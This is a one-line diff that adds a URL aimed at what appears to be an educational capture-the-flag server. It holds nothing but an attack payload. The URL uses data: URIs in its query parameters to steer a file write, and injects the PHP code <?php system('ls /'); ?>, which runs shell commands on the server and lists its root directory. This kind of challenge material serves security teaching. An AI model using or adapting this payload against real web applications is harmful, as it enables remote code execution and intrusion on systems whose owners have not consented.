@@ -1,0 +1,1 @@
+https://edu-ctf.csie.org:10155/?f=data:+,mydir&i=data:+,mydir/meow&c[]=<?php system('ls /'); ?>
